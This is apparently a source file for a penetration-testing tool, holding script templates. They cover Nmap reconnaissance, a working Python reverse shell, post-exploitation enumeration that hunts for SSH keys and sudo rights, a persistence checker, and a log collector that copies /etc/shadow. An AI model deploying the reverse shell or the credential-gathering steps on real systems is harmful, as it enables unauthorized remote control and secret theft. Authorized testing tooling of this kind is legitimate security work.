"""Built-in script templates for common pentest tasks."""
from __future__ import annotations

from typing import TypedDict


class TemplateInfo(TypedDict):
    description: str
    category: str
    language: str
    tags: list[str]
    deps: list[str]
    content: str


TEMPLATES: dict[str, TemplateInfo] = {
    "recon/nmap": {
        "description": "Professional multi-phase Nmap reconnaissance (pro-grade)",
        "category": "recon",
        "language": "bash",
        "tags": ["nmap", "recon", "port-scan", "service-detection", "vuln", "osint"],
        "deps": ["nmap"],
        "content": """\
#!/usr/bin/env bash
# =============================================================================
# nmap_recon.sh  —  Professional Multi-Phase Nmap Reconnaissance
# =============================================================================
# Description : Complete Nmap scanner with phased workflow and reporting.
#
#   Phase 1  Host discovery        (ping sweep)
#   Phase 2  TCP port scan         (depth depends on --mode)
#   Phase 3  Service/version       (-sV --version-intensity 7)
#   Phase 4  NSE script scanning   (default + banner; +vuln in vuln mode)
#   Phase 5  OS fingerprinting     (requires root, --os flag)
#   Phase 6  UDP top-200 scan      (requires root, --udp flag)
#
# Output    : <dir>/pN_*.{nmap,gnmap,xml,html}  +  final summary
# Requires  : nmap >= 7.80
# Optional  : xsltproc (HTML reports), sudo/root (SYN scan, OS, UDP)
#
# Usage     : ./nmap_recon.sh [options] <target>
# =============================================================================
set -euo pipefail

readonly VERSION="1.0.0"
readonly SCRIPT_NAME="$(basename "${BASH_SOURCE[0]}")"
readonly TS_START="$(date +%s)"

# ── Colors (auto-disabled outside a terminal) ─────────────────────────────
if [[ -t 1 ]]; then
    RED=$(tput setaf 1 2>/dev/null || echo '')
    GRN=$(tput setaf 2 2>/dev/null || echo '')
    YLW=$(tput setaf 3 2>/dev/null || echo '')
    BLU=$(tput setaf 4 2>/dev/null || echo '')
    MGT=$(tput setaf 5 2>/dev/null || echo '')
    CYN=$(tput setaf 6 2>/dev/null || echo '')
    BOLD=$(tput bold   2>/dev/null || echo '')
    DIM=$(tput dim     2>/dev/null || echo '')
    RST=$(tput sgr0    2>/dev/null || echo '')
else
    RED=''; GRN=''; YLW=''; BLU=''; MGT=''; CYN=''
    BOLD=''; DIM=''; RST=''
fi

readonly SEP="════════════════════════════════════════════════════════════"
readonly SUB="────────────────────────────────────────────────────────────"

# ── Defaults ─────────────────────────────────────────────────────────────────
MODE="standard"   # quick | standard | full | stealth | vuln
PORTS=""          # custom -p range (overrides mode)
TOP_PORTS=""      # override --top-ports N
TIMING=4          # nmap -T0..5
EXTRA_SCRIPTS=""  # extra NSE scripts (comma-separated)
OUTPUT_DIR=""     # default: ./recon_<target>_<date>/
NO_PING=false     # -Pn  skip host discovery
OS_DETECT=false   # phase 5: -O  (root)
UDP_SCAN=false    # phase 6: -sU (root)
VERBOSE=false
DRY_RUN=false
TARGET=""
OPEN_PORTS=""     # populated after phase 2

# ── Logging ──────────────────────────────────────────────────────────────────
_ts()  { date '+%H:%M:%S'; }
log()  { echo "${DIM}[$(_ts)]${RST} ${BLU}[*]${RST} $*"; }
ok()   { echo "${DIM}[$(_ts)]${RST} ${GRN}[+]${RST} $*"; }
warn() { echo "${DIM}[$(_ts)]${RST} ${YLW}[!]${RST} $*" >&2; }
err()  { echo "${DIM}[$(_ts)]${RST} ${RED}[-]${RST} $*" >&2; }
die()  { err "$*"; exit 1; }
dbg()  { "$VERBOSE" && echo "${DIM}[$(_ts)][D]${RST} $*" || true; }

section() {
    echo ""
    echo "${BOLD}${CYN}${SEP}${RST}"
    echo "${BOLD}${CYN}  $1${RST}"
    echo "${CYN}${SUB}${RST}"
}

banner() {
    echo "${BOLD}${MGT}"
    cat <<'BANNER'
  ╔═══════════════════════════════════════╗
  ║   GS-CYBERsecu  ·  nmap-recon        ║
  ╚═══════════════════════════════════════╝
BANNER
    echo "${RST}${DIM}  Professional Multi-Phase Nmap Reconnaissance  v${VERSION}${RST}"
    echo ""
}

# ── Usage ─────────────────────────────────────────────────────────────────────
usage() {
    cat <<EOF
${BOLD}Usage:${RST}
  ${SCRIPT_NAME} [options] <target>

${BOLD}Target:${RST}
  IP, CIDR range, hostname, or file path for nmap -iL

${BOLD}Scan modes  (-m):${RST}
  ${GRN}quick${RST}      Top 1000 TCP  | T4 | no scripts           ~  1 min
  ${GRN}standard${RST}   Top 5000 TCP  | T4 | default+banner       ~  5 min  (default)
  ${GRN}full${RST}       All 65535 TCP | T4 | default+banner       ~ 20 min
  ${GRN}stealth${RST}    Top 5000 TCP  | T2 | fragmented | random  ~ 15 min
  ${GRN}vuln${RST}       Top 5000 TCP  | T4 | default+banner+vuln  ~ 30 min

${BOLD}Options:${RST}
  -m, --mode <mode>        Scan mode  (default: standard)
  -p, --ports <range>      Custom port range, e.g. 22,80,443,8000-9000
      --top-ports <n>      Scan top N ports
  -T, --timing <0-5>       Nmap timing template  (default: 4)
  -o, --output <dir>       Output directory  (default: ./recon_TARGET_DATE)
      --scripts <list>     Additional NSE scripts, comma-separated
      --no-ping            Skip host discovery (-Pn)
      --os                 Phase 5: OS fingerprinting  (requires root)
      --udp                Phase 6: UDP top-200 scan   (requires root)
  -v, --verbose            Verbose output
      --dry-run            Print nmap commands without executing
  -h, --help               Show this help

${BOLD}Examples:${RST}
  ${SCRIPT_NAME} 10.10.14.5
  ${SCRIPT_NAME} -m full --os --udp 192.168.1.1
  ${SCRIPT_NAME} -m stealth -T2 --no-ping 10.10.10.0/24
  ${SCRIPT_NAME} -m vuln -o /tmp/audit 10.0.0.0/24
  ${SCRIPT_NAME} -p 80,443,8080-8090 --scripts "http-title,ssl-cert" 192.168.0.1

EOF
    exit 0
}

# ── Argument parsing ──────────────────────────────────────────────────────────
parse_args() {
    [[ $# -eq 0 ]] && { banner; usage; }
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -m|--mode)       MODE="$2";          shift 2 ;;
            -p|--ports)      PORTS="$2";         shift 2 ;;
               --top-ports)  TOP_PORTS="$2";     shift 2 ;;
            -T|--timing)     TIMING="$2";        shift 2 ;;
            -o|--output)     OUTPUT_DIR="$2";    shift 2 ;;
               --scripts)    EXTRA_SCRIPTS="$2"; shift 2 ;;
               --no-ping)    NO_PING=true;       shift   ;;
               --os)         OS_DETECT=true;     shift   ;;
               --udp)        UDP_SCAN=true;      shift   ;;
            -v|--verbose)    VERBOSE=true;       shift   ;;
               --dry-run)    DRY_RUN=true;       shift   ;;
            -h|--help)       usage ;;
            -*) die "Unknown option: $1 — run ${SCRIPT_NAME} --help" ;;
            *)  TARGET="$1"; shift ;;
        esac
    done
}

# ── Validation ────────────────────────────────────────────────────────────────
validate() {
    [[ -z "$TARGET" ]] && die "No target specified — run: ${SCRIPT_NAME} --help"
    local valid="quick standard full stealth vuln"
    [[ " ${valid} " == *" ${MODE} "* ]] || die "Invalid mode '${MODE}'. Valid: ${valid}"
    [[ "$TIMING" =~ ^[0-5]$ ]] || die "Timing must be 0–5, got: ${TIMING}"
    command -v nmap &>/dev/null || die "nmap not found — install: sudo apt install nmap"
    if { "$OS_DETECT" || "$UDP_SCAN" || [[ "$MODE" == "stealth" ]]; } && [[ $EUID -ne 0 ]]; then
        warn "OS detection, UDP, and SYN stealth require root — those phases will be skipped or degraded."
    fi
    dbg "$(nmap --version | head -1)"
}

# ── Output directory ──────────────────────────────────────────────────────────
setup_output() {
    local safe stamp
    safe="$(echo "$TARGET" | tr '/:' '__' | tr -c 'a-zA-Z0-9._-' '_')"
    stamp="$(date '+%Y%m%d_%H%M%S')"
    OUTPUT_DIR="${OUTPUT_DIR:-./recon_${safe}_${stamp}}"
    mkdir -p "$OUTPUT_DIR"
    ok "Output dir : ${BOLD}${OUTPUT_DIR}${RST}"
}

# ── Scan type: SYN (root) or TCP Connect (non-root) ──────────────────────────
_scan_type() { [[ $EUID -eq 0 ]] && echo "-sS" || echo "-sT"; }

# ── Execute one nmap phase ────────────────────────────────────────────────────
run_phase() {
    # run_phase <output_base> [nmap args...]
    local out="$1"; shift
    log "nmap $* -oA ${out}"
    "$DRY_RUN" && { warn "[DRY-RUN] nmap $* -oA ${out}"; return 0; }
    nmap "$@" -oA "$out" 2>&1 | tee "${out}.log"
}

# ── Phase 1: Host Discovery ───────────────────────────────────────────────────
phase1_discovery() {
    section "Phase 1 ── Host Discovery"
    if "$NO_PING"; then log "Skipped (--no-ping)"; return; fi
    local out="${OUTPUT_DIR}/p1_discovery"
    run_phase "$out" -sn -T4 "$TARGET"
    if [[ -f "${out}.gnmap" ]]; then
        local up
        up="$(grep -c 'Status: Up' "${out}.gnmap" 2>/dev/null || echo 0)"
        ok "Hosts up: ${BOLD}${GRN}${up}${RST}"
    fi
}

# ── Phase 2: Port Scan ────────────────────────────────────────────────────────
phase2_portscan() {
    section "Phase 2 ── TCP Port Scan  [${BOLD}${MODE}${RST}]"
    local out="${OUTPUT_DIR}/p2_portscan"
    local st timing
    st="$(_scan_type)"
    timing="-T${TIMING}"
    [[ "$MODE" == "stealth" ]] && timing="-T2"

    local -a port_args
    if   [[ -n "$PORTS" ]];     then port_args=(-p "$PORTS")
    elif [[ -n "$TOP_PORTS" ]]; then port_args=(--top-ports "$TOP_PORTS")
    else
        case "$MODE" in
            quick)         port_args=(--top-ports 1000) ;;
            full|vuln)     port_args=(-p-) ;;
            stealth)       port_args=(--top-ports 5000 -f --randomize-hosts) ;;
            *)             port_args=(--top-ports 5000) ;;
        esac
    fi

    run_phase "$out" "$st" $timing "${port_args[@]}" "$TARGET"

    if [[ -f "${out}.gnmap" ]]; then
        OPEN_PORTS="$(grep -oE '[0-9]+/open/tcp' "${out}.gnmap" | grep -oE '^[0-9]+' | sort -n | tr '\\n' ',' | sed 's/,$//' || true)"
    fi

    if [[ -z "$OPEN_PORTS" ]]; then
        warn "No open TCP ports found — check connectivity or try --no-ping."
    else
        ok "Open TCP ports: ${BOLD}${GRN}${OPEN_PORTS}${RST}"
    fi
}

# ── Phase 3: Service & Version Detection ──────────────────────────────────────
phase3_services() {
    section "Phase 3 ── Service & Version Detection"
    if [[ -z "$OPEN_PORTS" ]]; then warn "Skipped — no open ports."; return; fi
    local out="${OUTPUT_DIR}/p3_services"
    run_phase "$out" "$(_scan_type)" -T"${TIMING}" -sV --version-intensity 7 -p "$OPEN_PORTS" "$TARGET"
}

# ── Phase 4: NSE Script Scanning ──────────────────────────────────────────────
phase4_scripts() {
    section "Phase 4 ── NSE Script Scanning"
    if [[ -z "$OPEN_PORTS" ]]; then warn "Skipped — no open ports."; return; fi
    if [[ "$MODE" == "quick" ]]; then log "Skipped (quick mode)."; return; fi
    local out="${OUTPUT_DIR}/p4_scripts"
    local scripts="default,banner"
    [[ "$MODE" == "vuln" ]] && scripts="default,banner,vuln"
    [[ -n "$EXTRA_SCRIPTS" ]] && scripts="${scripts},${EXTRA_SCRIPTS}"
    run_phase "$out" "$(_scan_type)" -T"${TIMING}" --script "$scripts" -p "$OPEN_PORTS" "$TARGET"
}

# ── Phase 5: OS Fingerprinting ────────────────────────────────────────────────
phase5_os() {
    "$OS_DETECT" || return 0
    section "Phase 5 ── OS Fingerprinting"
    if [[ $EUID -ne 0 ]]; then warn "Skipped — requires root."; return; fi
    if [[ -z "$OPEN_PORTS" ]]; then warn "Skipped — no open ports."; return; fi
    run_phase "${OUTPUT_DIR}/p5_os" -sS -T"${TIMING}" -O --osscan-guess -p "$OPEN_PORTS" "$TARGET"
}

# ── Phase 6: UDP Top-200 ──────────────────────────────────────────────────────
phase6_udp() {
    "$UDP_SCAN" || return 0
    section "Phase 6 ── UDP Top-200 Scan"
    if [[ $EUID -ne 0 ]]; then warn "Skipped — requires root."; return; fi
    local out="${OUTPUT_DIR}/p6_udp"
    run_phase "$out" -sU -T4 --top-ports 200 --open "$TARGET"
    if [[ -f "${out}.gnmap" ]]; then
        local udp_open
        udp_open="$(grep -oE '[0-9]+/open/udp' "${out}.gnmap" | grep -oE '^[0-9]+' | sort -n | tr '\\n' ',' | sed 's/,$//' || true)"
        [[ -n "$udp_open" ]] && ok "Open UDP ports: ${BOLD}${GRN}${udp_open}${RST}"
    fi
}

# ── HTML Report ───────────────────────────────────────────────────────────────
generate_html() {
    command -v xsltproc &>/dev/null || return 0
    local xsl
    xsl="$(find /usr/share/nmap -name 'nmap.xsl' 2>/dev/null | head -1)"
    [[ -z "$xsl" ]] && return 0
    section "HTML Report Generation"
    local count=0
    for xml_file in "${OUTPUT_DIR}"/p*.xml; do
        [[ -f "$xml_file" ]] || continue
        local html_file="${xml_file%.xml}.html"
        xsltproc -o "$html_file" "$xsl" "$xml_file" 2>/dev/null && ok "HTML: $(basename "$html_file")" && (( count++ )) || true
    done
    [[ $count -gt 0 ]] && ok "${count} HTML report(s) generated." || true
}

# ── Final Summary ─────────────────────────────────────────────────────────────
summary() {
    local elapsed min sec
    elapsed=$(( $(date +%s) - TS_START ))
    min=$(( elapsed / 60 ))
    sec=$(( elapsed % 60 ))

    section "Scan Complete"

    local svc_file="${OUTPUT_DIR}/p3_services.nmap"
    if [[ -f "$svc_file" ]]; then
        echo ""
        echo "${BOLD}Open ports and services:${RST}"
        grep -E "^[0-9]+/tcp[[:space:]]+open" "$svc_file" | while IFS= read -r line; do
            echo "  ${GRN}${line}${RST}"
        done || true
    fi

    echo ""
    echo "${BOLD}Output files:${RST}"
    find "$OUTPUT_DIR" -maxdepth 1 -type f -name 'p*' | sort | while IFS= read -r f; do
        local sz
        sz="$(du -sh "$f" 2>/dev/null | cut -f1)"
        echo "  ${DIM}[${sz}]${RST}  $(basename "$f")"
    done

    echo ""
    echo "${BOLD}${CYN}${SEP}${RST}"
    echo "  ${BOLD}Target  :${RST}  ${TARGET}"
    echo "  ${BOLD}Mode    :${RST}  ${MODE}"
    echo "  ${BOLD}Ports   :${RST}  ${OPEN_PORTS:-none found}"
    echo "  ${BOLD}Duration:${RST}  ${min}m ${sec}s"
    echo "  ${BOLD}Output  :${RST}  ${OUTPUT_DIR}/"
    echo "${BOLD}${CYN}${SEP}${RST}"
    echo ""
}

# ── Cleanup on interrupt ──────────────────────────────────────────────────────
cleanup() {
    echo ""
    warn "Interrupted — partial results saved to: ${OUTPUT_DIR}/"
    exit 130
}
trap cleanup INT TERM

# ── Entry point ───────────────────────────────────────────────────────────────
main() {
    banner
    parse_args "$@"
    validate
    setup_output

    log "Target  : ${BOLD}${TARGET}${RST}"
    log "Mode    : ${BOLD}${MODE}${RST}"
    log "Timing  : T${TIMING}"
    [[ -n "$PORTS" ]] && log "Ports   : ${PORTS}"
    "$OS_DETECT"  && log "OS detection : enabled"
    "$UDP_SCAN"   && log "UDP scan     : enabled"
    "$DRY_RUN"    && warn "DRY-RUN — commands will be printed, not executed."

    phase1_discovery
    phase2_portscan
    phase3_services
    phase4_scripts
    phase5_os
    phase6_udp
    generate_html
    summary
}

main "$@"
""",
    },

    "exploit/revshell-python": {
        "description": "Python reverse shell skeleton (authorized testing only)",
        "category": "exploit",
        "language": "python",
        "tags": ["revshell", "exploit"],
        "deps": [],
        "content": """\
#!/usr/bin/env python3
# Template: exploit/revshell-python
# IMPORTANT: For authorized penetration testing only.
# Usage: python3 revshell.py <lhost> <lport>
import socket
import subprocess
import sys


def connect(host: str, port: int) -> None:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        s.send(b"[*] Connected\\n")
        while True:
            cmd = s.recv(4096).decode().strip()
            if not cmd or cmd.lower() in ("exit", "quit"):
                break
            try:
                out = subprocess.check_output(
                    cmd, shell=True, stderr=subprocess.STDOUT, timeout=30
                )
                s.send(out or b"(no output)\\n")
            except subprocess.CalledProcessError as e:
                s.send(e.output or b"(error)\\n")
            except subprocess.TimeoutExpired:
                s.send(b"(command timed out)\\n")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <lhost> <lport>")
        sys.exit(1)
    connect(sys.argv[1], int(sys.argv[2]))
""",
    },

    "post-exploit/sysinfo": {
        "description": "System information gathering for post-exploitation",
        "category": "post-exploit",
        "language": "bash",
        "tags": ["sysinfo", "enumeration", "post-exploit"],
        "deps": [],
        "content": """\
#!/usr/bin/env bash
# Template: post-exploit/sysinfo
# Gathers system information for post-exploitation enumeration
set -euo pipefail

sep() { echo ""; echo "=== $1 ==="; }

sep "SYSTEM"
uname -a

sep "CURRENT USER"
id && whoami

sep "NETWORK INTERFACES"
ip addr show 2>/dev/null || ifconfig 2>/dev/null || echo "N/A"

sep "LISTENING PORTS"
ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || echo "N/A"

sep "SUDO RIGHTS"
sudo -l 2>/dev/null || echo "N/A (no sudo or not allowed)"

sep "SUID BINARIES (top 20)"
find / -perm -4000 -type f 2>/dev/null | head -20

sep "WRITABLE DIRECTORIES"
find /tmp /var/tmp /dev/shm -writable -type d 2>/dev/null

sep "CRONTABS"
crontab -l 2>/dev/null || echo "(none for current user)"
ls /etc/cron* 2>/dev/null || true

sep "INTERESTING FILES"
find /home /root -name "*.txt" -o -name "*.key" -o -name "id_rsa" 2>/dev/null | head -20

sep "ENVIRONMENT"
env | sort
""",
    },

    "post-exploit/persistence-check": {
        "description": "Check common persistence mechanisms on Linux",
        "category": "post-exploit",
        "language": "bash",
        "tags": ["persistence", "post-exploit", "forensic"],
        "deps": [],
        "content": """\
#!/usr/bin/env bash
# Template: post-exploit/persistence-check
# Checks common persistence locations on Linux
set -euo pipefail

sep() { echo ""; echo "=== $1 ==="; }

sep "CRONTABS (all users)"
for user in $(cut -d: -f1 /etc/passwd); do
    crontab -u "$user" -l 2>/dev/null | grep -v '^#' | grep -v '^$' \
        && echo "  ↑ user: $user" || true
done
cat /etc/cron* /etc/cron.d/* 2>/dev/null | grep -v '^#' | grep -v '^$' || true

sep "SYSTEMD SERVICES (non-standard)"
systemctl list-units --type=service --state=enabled 2>/dev/null \
    | grep -v '/lib/systemd' | grep -v '/usr/lib/systemd' || true

sep "INIT.D SCRIPTS"
ls /etc/init.d/ 2>/dev/null || true

sep "BASHRC / PROFILE HOOKS"
for f in /etc/profile /etc/bashrc ~/.bashrc ~/.profile ~/.bash_profile; do
    [ -f "$f" ] && echo "--- $f ---" && cat "$f" || true
done

sep "AUTHORIZED KEYS"
find /home /root -name "authorized_keys" -exec echo "--- {} ---" \\; -exec cat {} \\; 2>/dev/null || true

sep "SUID/SGID BINARIES"
find / -type f \\( -perm -4000 -o -perm -2000 \\) 2>/dev/null
""",
    },

    "forensic/log-collect": {
        "description": "Collect system logs for forensic analysis",
        "category": "forensic",
        "language": "bash",
        "tags": ["logs", "forensic", "collect"],
        "deps": [],
        "content": """\
#!/usr/bin/env bash
# Template: forensic/log-collect
# Collect logs and system state to a forensic directory
set -euo pipefail

OUTPUT_DIR="${1:-./forensic_$(date +%Y%m%d_%H%M%S)}"
mkdir -p "$OUTPUT_DIR"
echo "[*] Collecting to $OUTPUT_DIR"

# Logs
cp -r /var/log "$OUTPUT_DIR/var_log" 2>/dev/null || true
journalctl --no-pager -n 10000 > "$OUTPUT_DIR/journal.txt" 2>/dev/null || true

# Processes and network
ps auxf > "$OUTPUT_DIR/processes.txt" 2>/dev/null
ss -anp > "$OUTPUT_DIR/ss.txt" 2>/dev/null || netstat -anp > "$OUTPUT_DIR/netstat.txt" 2>/dev/null || true
ip route > "$OUTPUT_DIR/routes.txt" 2>/dev/null || true

# Users and sessions
last > "$OUTPUT_DIR/last.txt" 2>/dev/null || true
lastb > "$OUTPUT_DIR/lastb.txt" 2>/dev/null || true
who > "$OUTPUT_DIR/who.txt" 2>/dev/null || true
w > "$OUTPUT_DIR/w.txt" 2>/dev/null || true

# Users / groups
cp /etc/passwd "$OUTPUT_DIR/passwd.txt"
cp /etc/group "$OUTPUT_DIR/group.txt"
cp /etc/shadow "$OUTPUT_DIR/shadow.txt" 2>/dev/null || true

# Hash manifest
find "$OUTPUT_DIR" -type f | sort | xargs sha256sum > "$OUTPUT_DIR/MANIFEST.sha256" 2>/dev/null || true

echo "[+] Collection complete: $OUTPUT_DIR"
echo "[+] Manifest: $OUTPUT_DIR/MANIFEST.sha256"
""",
    },

    "custom/skeleton-bash": {
        "description": "Bash script skeleton with argument parsing",
        "category": "custom",
        "language": "bash",
        "tags": ["template", "skeleton", "bash"],
        "deps": [],
        "content": """\
#!/usr/bin/env bash
# Script:      <name>
# Description: <description>
# Author:      <author>
# Usage:       ./<name>.sh [options] <target>
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
VERBOSE=false

usage() {
    cat <<EOF
Usage: $(basename "$0") [options] <target>

Options:
  -v, --verbose   Enable verbose output
  -o, --output    Output file (default: stdout)
  -h, --help      Show this help
EOF
    exit 1
}

log()  { echo "[*] $*"; }
ok()   { echo "[+] $*"; }
err()  { echo "[-] $*" >&2; }
dbg()  { "$VERBOSE" && echo "[D] $*" || true; }

main() {
    local target=""
    local output=""

    while [[ $# -gt 0 ]]; do
        case "$1" in
            -v|--verbose) VERBOSE=true ;;
            -o|--output)  output="$2"; shift ;;
            -h|--help)    usage ;;
            -*)           err "Unknown option: $1"; usage ;;
            *)            target="$1" ;;
        esac
        shift
    done

    [[ -z "$target" ]] && { err "Target required"; usage; }

    log "Starting against $target"
    # ── Your code here ──────────────────────────────────────────────────────

    # ────────────────────────────────────────────────────────────────────────
    ok "Done."
}

main "$@"
""",
    },

    "custom/skeleton-python": {
        "description": "Python script skeleton with argparse and logging",
        "category": "custom",
        "language": "python",
        "tags": ["template", "skeleton", "python"],
        "deps": [],
        "content": """\
#!/usr/bin/env python3
# Script:      <name>
# Description: <description>
# Author:      <author>
import argparse
import logging
import sys

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger(__name__)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="<description>")
    parser.add_argument("target", help="Target host, IP, or file")
    parser.add_argument("-o", "--output", help="Output file")
    parser.add_argument("-v", "--verbose", action="store_true")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    log.info("Starting against %s", args.target)

    # ── Your code here ───────────────────────────────────────────────────────

    # ────────────────────────────────────────────────────────────────────────

    log.info("Done.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
""",
    },
}


def list_templates() -> list[tuple[str, str, str, str]]:
    """Return (name, category, language, description) for all templates."""
    return [
        (name, t["category"], t["language"], t["description"])
        for name, t in sorted(TEMPLATES.items())
    ]


def get_template(name: str) -> TemplateInfo | None:
    """Return template by exact name, or None if not found."""
    return TEMPLATES.get(name)


def search_templates(keyword: str) -> list[str]:
    """Return template names matching keyword in name, description, or tags."""
    kw = keyword.lower()
    return [
        name
        for name, t in TEMPLATES.items()
        if kw in name.lower()
        or kw in t["description"].lower()
        or any(kw in tag for tag in t["tags"])
    ]
